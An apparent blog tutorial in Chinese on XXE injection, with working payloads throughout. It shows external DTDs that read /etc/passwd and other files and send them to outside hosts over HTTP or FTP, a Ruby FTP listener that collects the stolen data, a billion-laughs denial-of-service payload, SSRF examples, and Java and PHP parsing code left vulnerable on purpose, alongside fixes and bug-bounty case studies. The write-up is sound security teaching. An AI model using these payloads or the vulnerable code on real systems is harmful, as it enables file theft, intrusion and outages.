<p>无报错需要访问接受数据的服务器中的日志信息，可以看到经过base64编码过的数据，解码后便可以得到数据。</p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/1512974092509.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020464-1225045645.gif" alt="wu  1.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/15129741091027.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234020864-1258198362.gif" alt="wu 2.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/15129741255397.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234021122-1934005839.gif" alt="wu 3.png"></a></p>
<p><a target="_blank" rel="noopener" href="http://image.3001.net/images/20171211/15129741458706.png"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234021503-1164417528.gif" alt="wu 4.png"></a></p>
<h2 id="3-过滤了ENTITY关键字"><a href="#3-过滤了ENTITY关键字" class="headerlink" title="3.过滤了ENTITY关键字"></a>3.过滤了ENTITY关键字</h2><p>DTD文档支持这么一种定义，直接在定义文档类型的时候引入外部DTD文档，之后就是同样的姿势了</p>
<p>（本地测试没有成功，可能是姿势问题）</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE svg SYSTEM &quot;http:&#x2F;&#x2F;118.89.16.36&#x2F;evil.dtd&quot;&gt;
&lt;root&gt;&amp;test;&lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>evil.dtd</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
&lt;!DOCTYPE data [
&lt;!ENTITY a0 &quot;dos&quot; &gt;
    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
    &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
    &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="4-拒绝服务攻击"><a href="#4-拒绝服务攻击" class="headerlink" title="4.拒绝服务攻击"></a>4.拒绝服务攻击</h2><p>这个文件里面存在11111个实体引用，超出了合法的实体引用数量上限</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE data [
    &lt;!ENTITY a0 &quot;dos&quot; &gt;
    &lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
    &lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
    &lt;!ENTITY a3 &quot;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&amp;a2;&quot;&gt;
    &lt;!ENTITY a4 &quot;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&amp;a3;&quot;&gt;
]&gt;
&lt;data&gt;&amp;a4;&lt;&#x2F;data&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="XXE注入的tips"><a href="#XXE注入的tips" class="headerlink" title="XXE注入的tips"></a>XXE注入的tips</h1><p>1.任意读取txt文件正常，读取php文件报错。因为php文件本身包含&lt;等字符，利用php://filter的base64编码绕过<br>php://filter/read=convert.base64-encode/resource=<a target="_blank" rel="noopener" href="http://localhost:88/exponent/index.php">http://localhost:88/exponent/index.php</a></p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0″ encoding&#x3D;&quot;utf-8″?&gt;
&lt;!DOCTYPE entity [
    &lt;!ENTITY file SYSTEM ENTITY e SYSTEM “php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;http:&#x2F;&#x2F;wiki.wooyun.org”&gt;
]&gt;
&lt;wooyun&gt;
	&lt;external&gt;&amp;file;&lt;&#x2F;external&gt;
&lt;&#x2F;wooyun&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>2.第二种命名实体+外部实体+参数实体写法 中的evil.xml文件<br>对</p>
<p><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost:88/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p>错</p>
<p><code>&lt;!ENTITY % payload &quot;&lt;!ENTITY % send SYSTEM &#39;http://localhost:88/?content=%file;&#39;&gt;&quot;&gt; %payload;</code></p>
<p>里层嵌套为字符实体 例如 %为 &#37;web服务器uri get请求长度一般限制在2k,NET的System.XML会自动进行URLencode；<br>3.形参实体（就是带%的）只能在dtd（&lt;!DOCTYPE ANY[]）里面调用,其他实体要用’&amp;’开头，’;’结尾<br>4.不明白为什么无回显的情况下一定要三层实体嵌套才正确，二层嵌套就不对（evil.xml中直接写成<code>&lt;!ENTITY % send SYSTEM &#39;http://localhost:88/?content=%file;&#39;&gt;</code>或是<code>&lt;!ENTITY send SYSTEM &#39;http://localhost:88/?content=%file;&#39;&gt;</code>）</p>
<p>5.平时burp 抓包 可以在请求头添加 Content-type:application/xml<br>并添加 xml语句如果报错 或执行则有可能存在xxe漏洞，不断根据response fuzz即可</p>
<p>6.我们既然可以使用file协议读取本地文件，当然也可以使用http协议访问来造成SSRF攻击，甚至可以使用gopher协议。</p>
<p>具体能使用的协议主要取决于PHP，PHP默认支持file、http、ftp、php、compress、data、glob、phar、gopher协议。</p>
<p>如果PHP支持except模块，我们还可以利用except模块来执行系统命令。</p>
<p>简单的SSRF攻击实例如下：</p>
<pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot; ?&gt;
&lt;!DOCTYPE a [ 
	&lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;127.0.0.1:1234&#x2F;&quot;&gt; 
]&gt;
&lt;user&gt;
	&lt;name&gt;Striker&lt;&#x2F;name&gt;
	&lt;wechat&gt;strikersb&lt;&#x2F;wechat&gt;
	&lt;public_wechat&gt;sec_fe&lt;&#x2F;public_wechat&gt;
	&lt;website&gt;&amp;b;&lt;&#x2F;website&gt;
&lt;&#x2F;user&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>然后就可以监听到访问了。</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234022195-1115935486.gif" alt="14916801785469.jpg"></p>
<p>SSRF攻击可以成功的话，我们自然可以进而攻击企业内网的系统。</p>
<p>其他更多的危害各位可以参考OWASP出的文档：</p>
<p><a target="_blank" rel="noopener" href="https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf">https://www.owasp.org/images/5/5d/XML_Exteral_Entity_Attack.pdf</a></p>
<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>XXE漏洞目前还未受到广泛关注,Wooyun上几个XXE引起的安全问题:</p>
<p>·<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-09351">pull-in任意文件遍历/下载</a></p>
<p>·<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-059911">从开源中国的某XXE漏洞到主站shell</a></p>
<p>·<a target="_blank" rel="noopener" href="http://paper.wooyun.org/bugs/wooyun-2014-058381">百度某功能XML实体注入</a></p>
<p>·<a target="_blank" rel="noopener" href="http://www.wooyun.org/bugs/wooyun-2010-059783">百度某功能XML实体注入（二）</a></p>
<p>借助XXE,攻击者可以实现任意文件读取,DOS拒绝服务攻击以及代理扫描内网等.</p>
<p>对于不同XML解析器,对外部实体有不同处理规则,在PHP中默认处理的函数为:</p>
<p>xml_parse</p>
<p>和</p>
<p>simplexml_load</p>
<p>xml_parse的实现方式为expat库，默认情况不会解析外部实体,而simplexml_load默认情况下会解析外部实体,造成安全威胁.</p>
<p>除PHP外，在Java，Python等处理xml的组件及函数中都可能存在此问题</p>
<h1 id="Java中的XXE利用"><a href="#Java中的XXE利用" class="headerlink" title="Java中的XXE利用"></a>Java中的XXE利用</h1><h2 id="1-漏洞代码"><a href="#1-漏洞代码" class="headerlink" title="1.漏洞代码"></a>1.漏洞代码</h2><p>造成Java XXE漏洞的代码，真的非常多。比如下面的漏洞代码。</p>
<p>import org.apache.commons.digester3.Digester;</p>
<p>maven配置：</p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.commons<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>commons-digester3<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>代码</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@RequestMapping</span><span class="token punctuation">(</span><span class="token string">"/xxe"</span><span class="token punctuation">)</span>
<span class="token annotation punctuation">@ResponseBody</span>
<span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">xxetest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> xml_con <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"xml"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Digester</span> digester <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Digester</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        digester<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>xml_con<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"except"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个代码使用Digester类，所以最后修复代码需要使用该类的setFeature方法。</p>
<p>修复代码：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">xxetest</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">String</span> xml_con <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"xml"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Digester</span> digester <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Digester</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token comment">// parse解析之前设置</span>
        digester<span class="token punctuation">.</span><span class="token function">setFeature</span><span class="token punctuation">(</span><span class="token string">"http://apache.org/xml/features/disallow-doctype-decl"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        digester<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringReader</span><span class="token punctuation">(</span>xml_con<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token string">"test"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token string">"except"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>再次利用时，会提示将功能”<a target="_blank" rel="noopener" href="http://apache.org/xml/features/disallow-doctype-decl&quot;设置为&quot;真&quot;时，不允许使用DOCTYPE。所以，这应该是在检测解析的内容是否有DOCTYPE，DOCTYPE是定义DTD的宏。黑盒测试，检测的内容为">http://apache.org/xml/features/disallow-doctype-decl&quot;设置为&quot;真&quot;时，不允许使用DOCTYPE。所以，这应该是在检测解析的内容是否有DOCTYPE，DOCTYPE是定义DTD的宏。黑盒测试，检测的内容为</a>&lt;!DOCTYPE，毕竟设置的features为disallow-doctype-decl。</p>
<p>其他类造成的XXE修复方案，可以参考这个文档。<a target="_blank" rel="noopener" href="http://find-sec-bugs.github.io/bugs.htm">http://find-sec-bugs.github.io/bugs.htm</a></p>
<h2 id="2-payload"><a href="#2-payload" class="headerlink" title="2.payload"></a>2.payload</h2><p>该payload读取/etc/redhat-release文件内容。该文件内容一般情况下只有一行，所以用来证明XXE的任意文件读取，还比较合适。</p>
<p>URL编码后的payload：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;%3fxml+version%3d&quot;1.0&quot;%3f&gt;&lt;!DOCTYPE+root+%5b&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a%2f%2ftest.joychou.me%3a8081%2fevil.xml&quot;&gt;%25remote%3b%5d&gt;&lt;root%2f&gt;EM+&quot;http%3a%2f%2ftest.joychou.me%3a8081%2fevil.xml&quot;&gt;%25remote%3b%5d&gt;&lt;root%2f&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>解码为：</p>
<pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;test.joychou.me:8081&#x2F;evil.xml&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://test.joychou.me:8081/evil.xml的内容如下：">http://test.joychou.me:8081/evil.xml的内容如下：</a></p>
<pre class="line-numbers language-none"><code class="language-none">&lt;!ENTITY % payload SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;redhat-release&quot;&gt;
&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; trick SYSTEM &#39;http:&#x2F;&#x2F;test.joychou.me:8081&#x2F;%payload;&#39;&gt;&quot;&gt;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>用这个的方式，可以来证明任意文件读取。</p>
<h2 id="3-协议问题"><a href="#3-协议问题" class="headerlink" title="3.协议问题"></a>3.协议问题</h2><p>Java在Blind XXE的利用上，读取文件会有些问题。</p>
<p>在PHP中，我们可以使用php://filter/read=convert.base64-encode/resource=/etc/hosts方法将文本内容进行base64编码。</p>
<p>Java中，没这样编码方法，所以如果要读取换行的文件，一般使用FTP协议，HTTP协议会由于存在换行等字符，请求会发送失败。</p>
<p>FTP读取方法可以参考这篇文章，里面也有FTP Server的相关代码。<a target="_blank" rel="noopener" href="http://www.voidcn.com/article/p-njawsjxm-ko.html">http://www.voidcn.com/article/p-njawsjxm-ko.html</a></p>
<p>开启一个匿名登录的FTP Server，端口为33的ruby脚本，ftp.rb</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">require</span> <span class="token string">'socket'</span>
server <span class="token operator">=</span> <span class="token constant">TCPServer</span><span class="token punctuation">.</span><span class="token keyword">new</span> <span class="token number">33</span>
loop <span class="token keyword">do</span>
 <span class="token builtin">Thread</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span>server<span class="token punctuation">.</span>accept<span class="token punctuation">)</span> <span class="token keyword">do</span> <span class="token operator">|</span>client<span class="token operator">|</span>
  puts <span class="token string">"New client connected"</span>
  data <span class="token operator">=</span> <span class="token string">""</span>
  client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string">"220 xxe-ftp-server"</span><span class="token punctuation">)</span>
  loop <span class="token punctuation">&#123;</span>
    req <span class="token operator">=</span> client<span class="token punctuation">.</span>gets<span class="token punctuation">(</span><span class="token punctuation">)</span>
    puts <span class="token string">"&lt; "</span><span class="token operator">+</span>req
    <span class="token keyword">if</span> req<span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span> <span class="token string">"USER"</span>
      client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string">"331 password please - version check"</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span>
      \<span class="token comment">#puts "> 230 more data please!"</span>
      client<span class="token punctuation">.</span>puts<span class="token punctuation">(</span><span class="token string">"230 more data please!"</span><span class="token punctuation">)</span>
    <span class="token keyword">end</span>
  <span class="token punctuation">&#125;</span>
 <span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="http://test.joychou.me:8081/evil.xml的内容如下：">http://test.joychou.me:8081/evil.xml的内容如下：</a></p>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml">&lt;!ENTITY % payload SYSTEM "file:///tmp/1.txt">
&lt;!ENTITY % int "&lt;!ENTITY <span class="token entity" title="&#37;">&amp;#37;</span> trick SYSTEM 'ftp://test.joychou.me:33/%payload;'>"><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>目的是读取XXE漏洞服务器上的/tmp/1.txt文件。</p>
<p>test.joychou.me服务器上执行ruby ftp.rb</p>
<p>访问URL，<a target="_blank" rel="noopener" href="http://localhost:8080/xxe?xml=%3C%3fxml+version%3d%221.0%22%3f%3E%3C!DOCTYPE+root+%5b%3C!ENTITY+%25+remote+SYSTEM+%22http%3a%2f%2ftest.joychou.me%3a8081%2fevil.xml%22%3E%25remote%3b%5d%3E%3Croot%2f%3E">http://localhost:8080/xxe?xml=%3C%3fxml+version%3d%221.0%22%3f%3E%3C!DOCTYPE+root+%5b%3C!ENTITY+%25+remote+SYSTEM+%22http%3a%2f%2ftest.joychou.me%3a8081%2fevil.xml%22%3E%25remote%3b%5d%3E%3Croot%2f%3E</a></p>
<p>/tmp/1.txt的内容为</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">cat</span> /tmp/1.txt
<span class="token builtin class-name">test</span>
xxe
<span class="token function">ftp</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>FTP Server收到以下内容：</p>
<pre class="line-numbers language-none"><code class="language-none">New client connected
&lt; USER anonymous
&lt; PASS Java1.8.0_121@
&lt; TYPE I
&lt; EPSV ALL
&lt; EPSV
&lt; EPRT |1|172.17.29.150|60731|
&lt; RETR test
&lt; xxe
&lt; ftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到完全读取了/tmp/1.txt的内容，并且还包括XXE漏洞服务器的内网IP 172.17.29.150。</p>
<p>不过有些字符只要存在，文件内容就会读取不到，比如#等字符，哪行有这些字符，读取前一行就结束。大家可以自行测试。</p>
<h2 id="4-漏洞修复代码"><a href="#4-漏洞修复代码" class="headerlink" title="4.漏洞修复代码"></a>4.漏洞修复代码</h2><p>把修复代码放在了github上。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/JoyChou93/java-sec-code">https://github.com/JoyChou93/java-sec-code</a></p>
<h1 id="PHP环境-XML外部实体注入漏洞（XXE）"><a href="#PHP环境-XML外部实体注入漏洞（XXE）" class="headerlink" title="PHP环境 XML外部实体注入漏洞（XXE）"></a>PHP环境 XML外部实体注入漏洞（XXE）</h1><p>环境介绍：</p>
<p>1.PHP 7.x 最新版</p>
<p>2.Apache 2.x 稳定版</p>
<p>3.libxml 2.8.0</p>
<p>libxml2.9.0以后，默认不解析外部实体，导致XXE漏洞逐渐消亡。为了演示PHP环境下的XXE漏洞，本例会将libxml2.8.0版本编译进PHP中。PHP版本并不影响XXE利用。</p>
<p>使用如下命令编译并启动环境：</p>
<p>docker-compose build docker-compose up -d</p>
<p>编译时间较长，请耐心等待。</p>
<p>环境启动后，访问<a target="_blank" rel="noopener" href="http://your-ip/index.php即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。">http://your-ip/index.php即可看到phpinfo，搜索libxml即可看到其版本为2.8.0。</a></p>
<p>Web目录为./www，其中包含4个文件：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tree <span class="token builtin class-name">.</span> <span class="token builtin class-name">.</span> 
├── dom.php <span class="token comment"># 示例：使用DOMDocument解析body </span>
├── index.php 
├── SimpleXMLElement.php <span class="token comment"># 示例：使用SimpleXMLElement类解析body</span>
└── simplexml_load_string.php <span class="token comment"># 示例：使用simplexml_load_string函数解析body</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dom.php、SimpleXMLElement.php、simplexml_load_string.php均可触发XXE漏洞，具体输出点请阅读这三个文件的代码。</p>
<p>Simple XXE Payload：<br><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt; &lt;!DOCTYPE xxe [ &lt;!ELEMENT name ANY &gt; &lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;]&gt; &lt;root&gt; &lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt; &lt;&#x2F;root&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
<p>或者:<br><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
    <span class="token variable">$a</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">XML</span> <span class="token comment">//书写XML文档</span>
    <span class="token constant">XML</span><span class="token punctuation">;</span>   <span class="token comment">//注：在高版本php中对外部实体的解析默认关闭了，所以下面要这样写来启用</span>
    <span class="token function">libxml_disable_entity_loader</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">simplexml_load_string</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'SimpleXMLElement'</span><span class="token punctuation">,</span> <span class="token constant">LIBXML_NOENT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$data</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<p>输出：</p>
<p><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234022769-149796291.jpg" alt="img"></p>
<h1 id="XXE的典型案例一"><a href="#XXE的典型案例一" class="headerlink" title="XXE的典型案例一"></a>XXE的典型案例一</h1><h2 id="1-Google-xxe的读取访问"><a href="#1-Google-xxe的读取访问" class="headerlink" title="1. Google xxe的读取访问"></a>1. Google xxe的读取访问</h2><p>URL：google.com/gadgets/directory?synd=toolbar</p>
<p>报告链接：<a target="_blank" rel="noopener" href="https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers">https://blog.detectify.com/2014/04/11/how-we-got-read-access-on-googles-production-servers</a></p>
<p>描述：</p>
<p>了解 XML 以及外部实体之后，这个漏洞实际上就非常直接了。Google 的工具栏按钮允许开发者定义它们自己的按钮，通过上传包含特定元数据的 XML 文件。</p>
<p>但是，根据 Detectify 小组，通过上传带有!ENTITY，指向外部文件的 XML 文件，Google 解析了该文件，并渲染了内容。因此，小组使用了 XXE 漏洞来渲染服务器的/etc/passwd文件。游戏结束。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wizardforcel/web-hacking-101-zh/blob/master/img/14-1-1.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234023646-1916420480.gif" alt="https://github.com/wizardforcel/web-hacking-101-zh/raw/master/img/14-1-1.jpg"></a></p>
<h2 id="2-Facebook-XXE"><a href="#2-Facebook-XXE" class="headerlink" title="2. Facebook XXE"></a>2. Facebook XXE</h2><p>URL：facebook.com/careers</p>
<p>报告链接：<a target="_blank" rel="noopener" href="http://www.attack-secure.com/blog/hacked-facebook-word-document">http://www.attack-secure.com/blog/hacked-facebook-word-document</a></p>
<p>描述：</p>
<p>这个 XXE 有一些区别，并且比第一个例子更有挑战，因为它涉及到远程调用服务器，就像我们在描述中讨论的那样。</p>
<p>2013 年末，Facebook 修补了一个 XXE 漏洞，它可能会升级为远程代码执行漏洞，因为/etc/passwd文件的内容是可访问的。因此在 Mohamed 于 2014 年 4 月挑战自己来渗透 Facebook 的时候，它不认为 XXE 可能存在，直到他发现它们的职位页面允许用户上传.docx文件，它可以包含 XML。对于那些不知道的人，.docx文件只是个 XML 文件的压缩包。所以，根据 Mohames，它创建了一个.docx文件，并使用 7zip 打开它来提取内容，并将下面的载荷插入了一个 XML 文件中。</p>
<pre class="line-numbers language-dtd" data-language="dtd"><code class="language-dtd">&lt;!DOCTYPE root [
    &lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;
    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;197.37.102.90&#x2F;ext.dtd&quot;&gt;
    %dtd;
    %send;
]&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>你会想到，在解析的时候，如果受害者开启了外部实体，XML 解析器会调用远程主机。要注意!ENTITY定义中和下面使用了%。这是因为这些占位符用在 DTD 自身中。在收到请求调用之后，远程服务器会发送回 DTD 文件，像这样：</p>
<p><code>&lt;!ENTITY send SYSTEM &#39;http://197.37.102.90/?%26file;&#39;&gt;&quot;</code></p>
<p>所以，回到文件中的载荷：</p>
<p>1.解析器会将%dtd;替换为获取远程 DTD 文件的调用。</p>
<p>2.解析器会将%send;替换为服务器的远程调用，但是%file;会替换为file:///etc/passwd的内容。</p>
<p>所以，Mohamed 使用 Python 和SimpleHTTPServer开启了一台本地服务器，并等待接收：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/wizardforcel/web-hacking-101-zh/blob/master/img/14-2-1.jpg"><img src="https://images2018.cnblogs.com/blog/1049983/201807/1049983-20180712234024240-1596034491.gif" alt="https://github.com/wizardforcel/web-hacking-101-zh/raw/master/img/14-2-1.jpg"></a></p>
